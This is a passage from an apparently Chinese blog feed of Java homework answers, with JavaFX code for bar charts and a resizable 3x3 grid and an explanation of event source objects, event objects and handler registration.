<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>shape<span class="token punctuation">.</span></span><span class="token class-name">Rectangle</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>text<span class="token punctuation">.</span></span><span class="token class-name">Text</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>stage<span class="token punctuation">.</span></span><span class="token class-name">Stage</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">FourBarCharts</span> <span class="token keyword">extends</span> <span class="token class-name">Application</span> <span class="token punctuation">{</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">start</span><span class="token punctuation">(</span><span class="token class-name">Stage</span> primaryStage<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">GridPane</span> gridPane <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">GridPane</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 添加四个柱状图到GridPane中</span>
        gridPane<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token class-name">Barchart</span><span class="token punctuation">(</span><span class="token string">"项目"</span><span class="token punctuation">,</span> <span class="token number">0.2</span><span class="token punctuation">,</span> <span class="token class-name">Color</span><span class="token punctuation">.</span><span class="token function">rgb</span><span class="token punctuation">(</span><span class="token number">22</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">67</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        gridPane<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token class-name">Barchart</span><span class="token punctuation">(</span><span class="token string">"测试"</span><span class="token punctuation">,</span> <span class="token number">0.1</span><span class="token punctuation">,</span> <span class="token class-name">Color</span><span class="token punctuation">.</span><span class="token constant">RED</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        gridPane<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token class-name">Barchart</span><span class="token punctuation">(</span><span class="token string">"期中考试"</span><span class="token punctuation">,</span> <span class="token number">0.3</span><span class="token punctuation">,</span> <span class="token class-name">Color</span><span class="token punctuation">.</span><span class="token constant">GREEN</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        gridPane<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token class-name">Barchart</span><span class="token punctuation">(</span><span class="token string">"期末考试"</span><span class="token punctuation">,</span> <span class="token number">0.4</span><span class="token punctuation">,</span> <span class="token class-name">Color</span><span class="token punctuation">.</span><span class="token constant">BLUE</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        gridPane<span class="token punctuation">.</span><span class="token function">setHgap</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">Scene</span> scene <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scene</span><span class="token punctuation">(</span>gridPane<span class="token punctuation">,</span> <span class="token number">500</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        primaryStage<span class="token punctuation">.</span><span class="token function">setTitle</span><span class="token punctuation">(</span><span class="token string">"BarCharts"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        primaryStage<span class="token punctuation">.</span><span class="token function">setScene</span><span class="token punctuation">(</span>scene<span class="token punctuation">)</span><span class="token punctuation">;</span>
        primaryStage<span class="token punctuation">.</span><span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">private</span> <span class="token class-name">Pane</span> <span class="token class-name">Barchart</span><span class="token punctuation">(</span><span class="token class-name">String</span> barName<span class="token punctuation">,</span> <span class="token keyword">double</span> percentage<span class="token punctuation">,</span> <span class="token class-name">Color</span> color<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">Pane</span> barPane <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Pane</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 根据传入的比例计算柱的高度</span>
        <span class="token keyword">double</span> barHeight <span class="token operator">=</span> <span class="token number">150</span> <span class="token operator">*</span> percentage<span class="token punctuation">;</span> <span class="token comment">// 设置最大高度为150px</span>
        <span class="token keyword">double</span> barY <span class="token operator">=</span> <span class="token number">150</span> <span class="token operator">-</span> barHeight<span class="token punctuation">;</span>

        <span class="token comment">// 创建柱状图</span>
        barName <span class="token operator">+=</span> <span class="token string">" - "</span> <span class="token operator">+</span> percentage <span class="token operator">*</span> <span class="token number">100</span> <span class="token operator">+</span> <span class="token string">"%"</span><span class="token punctuation">;</span>
        <span class="token keyword">double</span> barWidth <span class="token operator">=</span> barName<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">10</span><span class="token punctuation">;</span>
        <span class="token class-name">Rectangle</span> bar <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Rectangle</span><span class="token punctuation">(</span>barWidth<span class="token punctuation">,</span> barHeight<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 宽度为30px，高度根据传入的比例计算</span>
        bar<span class="token punctuation">.</span><span class="token function">setFill</span><span class="token punctuation">(</span>color<span class="token punctuation">)</span><span class="token punctuation">;</span>
        bar<span class="token punctuation">.</span><span class="token function">setLayoutY</span><span class="token punctuation">(</span>barY<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 创建柱名称</span>
        <span class="token class-name">Text</span> barLabel <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Text</span><span class="token punctuation">(</span>barName<span class="token punctuation">)</span><span class="token punctuation">;</span>
        barLabel<span class="token punctuation">.</span><span class="token function">setLayoutY</span><span class="token punctuation">(</span>barY <span class="token operator">-</span> <span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 放在柱的上方</span>

        barPane<span class="token punctuation">.</span><span class="token function">getChildren</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addAll</span><span class="token punctuation">(</span>bar<span class="token punctuation">,</span> barLabel<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">return</span> barPane<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<img src="/images/posts/pPzr2gU.png" alt="" onerror="this.onerror=null; this.src='https://z1.ax1x.com/2023/10/11/pPzr2gU.png'">
<h2 id="显示一个3-x-3-的网格请写一个绘制3-x-3-网格的程序如图所示-使用红色绘制垂直线蓝色绘制水平线-当窗体改变大小的时候这些线条自动改变大小"><a class="markdownIt-Anchor" href="#显示一个3-x-3-的网格请写一个绘制3-x-3-网格的程序如图所示-使用红色绘制垂直线蓝色绘制水平线-当窗体改变大小的时候这些线条自动改变大小"></a> （显示一个3 x 3 的网格）请写一个绘制3 x 3 网格的程序，如图所示。使用红色绘制垂直线，蓝色绘制水平线。当窗体改变大小的时候，这些线条自动改变大小</h2>
<img src="/images/posts/pPzdigH.png" alt="" onerror="this.onerror=null; this.src='https://z1.ax1x.com/2023/10/11/pPzdigH.png'">
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>application<span class="token punctuation">.</span></span><span class="token class-name">Application</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>stage<span class="token punctuation">.</span></span><span class="token class-name">Stage</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span></span><span class="token class-name">Scene</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>layout<span class="token punctuation">.</span></span><span class="token class-name">Pane</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>paint<span class="token punctuation">.</span></span><span class="token class-name">Color</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>shape<span class="token punctuation">.</span></span><span class="token class-name">Line</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">GridWithLines</span> <span class="token keyword">extends</span> <span class="token class-name">Application</span> <span class="token punctuation">{</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">start</span><span class="token punctuation">(</span><span class="token class-name">Stage</span> primaryStage<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>
        <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>
        <span class="token keyword">int</span> b <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>
        <span class="token class-name">Color</span> verticalLineColor <span class="token operator">=</span> <span class="token class-name">Color</span><span class="token punctuation">.</span><span class="token constant">RED</span><span class="token punctuation">;</span>
        <span class="token class-name">Color</span> horizonLineColor <span class="token operator">=</span> <span class="token class-name">Color</span><span class="token punctuation">.</span><span class="token constant">BLUE</span><span class="token punctuation">;</span>

        <span class="token class-name">Pane</span> pane <span class="token operator">=</span> <span class="token function">drawGrid</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> verticalLineColor<span class="token punctuation">,</span> horizonLineColor<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Scene</span> scene <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scene</span><span class="token punctuation">(</span>pane<span class="token punctuation">,</span> <span class="token number">400</span><span class="token punctuation">,</span> <span class="token number">400</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        primaryStage<span class="token punctuation">.</span><span class="token function">setTitle</span><span class="token punctuation">(</span><span class="token string">"GridWithLines"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        primaryStage<span class="token punctuation">.</span><span class="token function">setScene</span><span class="token punctuation">(</span>scene<span class="token punctuation">)</span><span class="token punctuation">;</span>
        primaryStage<span class="token punctuation">.</span><span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">private</span> <span class="token class-name">Pane</span> <span class="token function">drawGrid</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span> <span class="token keyword">int</span> b<span class="token punctuation">,</span> <span class="token class-name">Color</span> verticalLineColor<span class="token punctuation">,</span> <span class="token class-name">Color</span> horizonLineColor<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">Pane</span> gridPane <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Pane</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">double</span> cellWidth <span class="token operator">=</span> <span class="token number">1.0</span> <span class="token operator">/</span> a<span class="token punctuation">;</span>
        <span class="token keyword">double</span> cellHeight <span class="token operator">=</span> <span class="token number">1.0</span> <span class="token operator">/</span> b<span class="token punctuation">;</span>

        <span class="token comment">// 绘制垂直线</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> a<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token class-name">Line</span> verticalLine <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Line</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            verticalLine<span class="token punctuation">.</span><span class="token function">setStroke</span><span class="token punctuation">(</span>verticalLineColor<span class="token punctuation">)</span><span class="token punctuation">;</span>
            verticalLine<span class="token punctuation">.</span><span class="token function">startXProperty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span>gridPane<span class="token punctuation">.</span><span class="token function">widthProperty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">multiply</span><span class="token punctuation">(</span>i <span class="token operator">*</span> cellWidth<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            verticalLine<span class="token punctuation">.</span><span class="token function">endXProperty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span>verticalLine<span class="token punctuation">.</span><span class="token function">startXProperty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            verticalLine<span class="token punctuation">.</span><span class="token function">startYProperty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            verticalLine<span class="token punctuation">.</span><span class="token function">endYProperty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span>gridPane<span class="token punctuation">.</span><span class="token function">heightProperty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

            gridPane<span class="token punctuation">.</span><span class="token function">getChildren</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>verticalLine<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token comment">// 绘制水平线</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> b<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token class-name">Line</span> horizontalLine <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Line</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            horizontalLine<span class="token punctuation">.</span><span class="token function">setStroke</span><span class="token punctuation">(</span>horizonLineColor<span class="token punctuation">)</span><span class="token punctuation">;</span>
            horizontalLine<span class="token punctuation">.</span><span class="token function">startYProperty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span>gridPane<span class="token punctuation">.</span><span class="token function">heightProperty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">multiply</span><span class="token punctuation">(</span>i <span class="token operator">*</span> cellHeight<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            horizontalLine<span class="token punctuation">.</span><span class="token function">endYProperty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span>horizontalLine<span class="token punctuation">.</span><span class="token function">startYProperty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            horizontalLine<span class="token punctuation">.</span><span class="token function">startXProperty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            horizontalLine<span class="token punctuation">.</span><span class="token function">endXProperty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span>gridPane<span class="token punctuation">.</span><span class="token function">widthProperty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

            gridPane<span class="token punctuation">.</span><span class="token function">getChildren</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>horizontalLine<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">return</span> gridPane<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<img src="/images/posts/pPzrfu4.png" alt="" onerror="this.onerror=null; this.src='https://z1.ax1x.com/2023/10/11/pPzrfu4.png'">
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
        <tag>作业</tag>
      </tags>
  </entry>
  <entry>
    <title>Java作业-5</title>
    <url>/2023/10/18/01-26-39/</url>
    <content><![CDATA[<p>Javafx事件驱动和动画</p>
<span id="more"></span>
<h2 id="什么是事件源对象什么是事件对象描述事件源对象和事件对象之间的关系"><a class="markdownIt-Anchor" href="#什么是事件源对象什么是事件对象描述事件源对象和事件对象之间的关系"></a> 什么是事件源对象？什么是事件对象？描述事件源对象和事件对象之间的关系</h2>
<ul>
<li>
<p>事件源对象是触发特定事件的GUI组件，比如按钮（Button）、文本框（TextField）等。当用户与这些组件进行交互（如点击按钮）时，该组件就会生成一个事件对象并将其发送到事件队列。</p>
</li>
<li>
<p>事件对象是一个封装了与特定事件相关信息的对象。它通常是Event类或其子类的一个实例。事件对象包含了事件源、事件类型、时间戳等信息，这些信息有助于事件处理器确定如何响应该事件。</p>
</li>
<li>
<p>事件是从一个事件源上产生的对象:当一个事件在事件源对象上被触发时，相应的事件处理函数会被调用，并接收一个事件对象作为参数。这个事件对象包含了事件源对象以及其他有关事件的信息。</p>
<ul>
<li>触发事件：当在事件源对象（如按钮）上发生某个动作（如点击）时，会创建一个与之相关的事件对象。</li>
<li>传递信息：事件对象携带了事件的各种信息，包括哪个对象是事件源。这对于后续的事件处理是非常有用的。</li>
<li>事件队列与监听器：事件对象被发送到事件队列，并最终被传递到注册在该事件源对象上的事件处理器（或称为监听器）。</li>
<li>响应事件：事件处理器（监听器）根据事件对象的信息来决定如何响应。比如，你可能会检查事件类型或者事件源对象的状态，然后执行相应的代码。</li>
</ul>
</li>
</ul>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>application<span class="token punctuation">.</span></span><span class="token class-name">Application</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>event<span class="token punctuation">.</span></span><span class="token class-name">ActionEvent</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>event<span class="token punctuation">.</span></span><span class="token class-name">EventHandler</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span></span><span class="token class-name">Scene</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>control<span class="token punctuation">.</span></span><span class="token class-name">Button</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>layout<span class="token punctuation">.</span></span><span class="token class-name">StackPane</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>stage<span class="token punctuation">.</span></span><span class="token class-name">Stage</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token keyword">extends</span> <span class="token class-name">Application</span> <span class="token punctuation">{</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">start</span><span class="token punctuation">(</span><span class="token class-name">Stage</span> primaryStage<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">Button</span> btn <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Button</span><span class="token punctuation">(</span><span class="token string">"Click me"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        
        <span class="token comment">// 设置事件处理器</span>
        btn<span class="token punctuation">.</span><span class="token function">setOnAction</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">EventHandler</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">ActionEvent</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token annotation punctuation">@Override</span>
            <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">handle</span><span class="token punctuation">(</span><span class="token class-name">ActionEvent</span> event<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Button clicked!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token comment">// 在这里，`event` 就是事件对象，它包含了事件的信息</span>
                <span class="token comment">// `btn` 是事件源对象</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        
        <span class="token class-name">StackPane</span> root <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StackPane</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        root<span class="token punctuation">.</span><span class="token function">getChildren</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>btn<span class="token punctuation">)</span><span class="token punctuation">;</span>
        
        <span class="token class-name">Scene</span> scene <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scene</span><span class="token punctuation">(</span>root<span class="token punctuation">,</span> <span class="token number">300</span><span class="token punctuation">,</span> <span class="token number">250</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        
        primaryStage<span class="token punctuation">.</span><span class="token function">setTitle</span><span class="token punctuation">(</span><span class="token string">"Event Handling Example"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        primaryStage<span class="token punctuation">.</span><span class="token function">setScene</span><span class="token punctuation">(</span>scene<span class="token punctuation">)</span><span class="token punctuation">;</span>
        primaryStage<span class="token punctuation">.</span><span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">launch</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>在这个例子中，Button对象btn就是事件源对象，当点击这个按钮时，会生成一个ActionEvent事件对象并传递给handle方法。</p>
<h2 id="如何注册一个处理器对象以及如何实现一个处理器接口"><a class="markdownIt-Anchor" href="#如何注册一个处理器对象以及如何实现一个处理器接口"></a> 如何注册一个处理器对象，以及如何实现一个处理器接口？</h2>
<ul>
<li>在Java8及以上版本中可以使用Lambda表达式来注册事件处理器</li>
</ul>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Button</span> btn <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Button</span><span class="token punctuation">(</span><span class="token string">"Click me"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
btn<span class="token punctuation">.</span><span class="token function">setOnAction</span><span class="token punctuation">(</span>e <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Button clicked!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 这里的 `e` 是一个 ActionEvent 对象，包含了事件的信息。</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>通过实现特定的处理器接口来创建一个事件处理器类。通常，这个接口只有一个需要实现的方法，用于处理事件。</li>
</ul>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token keyword">extends</span> <span class="token class-name">Application</span> <span class="token punctuation">{</span>
    
    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">start</span><span class="token punctuation">(</span><span class="token class-name">Stage</span> primaryStage<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">Button</span> btn <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Button</span><span class="token punctuation">(</span><span class="token string">"Click me"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 创建并注册事件处理器</span>
        btn<span class="token punctuation">.</span><span class="token function">setOnAction</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">MyButtonHandler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">StackPane</span> root <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StackPane</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        root<span class="token punctuation">.</span><span class="token function">getChildren</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>btn<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">Scene</span> scene <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scene</span><span class="token punctuation">(</span>root<span class="token punctuation">,</span> <span class="token number">300</span><span class="token punctuation">,</span> <span class="token number">250</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        primaryStage<span class="token punctuation">.</span><span class="token function">setTitle</span><span class="token punctuation">(</span><span class="token string">"Event Handling Example with Interface"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        primaryStage<span class="token punctuation">.</span><span class="token function">setScene</span><span class="token punctuation">(</span>scene<span class="token punctuation">)</span><span class="token punctuation">;</span>
        primaryStage<span class="token punctuation">.</span><span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">// 实现 EventHandler 接口</span>
    <span class="token keyword">class</span> <span class="token class-name">MyButtonHandler</span> <span class="token keyword">implements</span> <span class="token class-name">EventHandler</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">ActionEvent</span><span class="token punctuation">&gt;</span></span> <span class="token punctuation">{</span>
        <span class="token annotation punctuation">@Override</span>
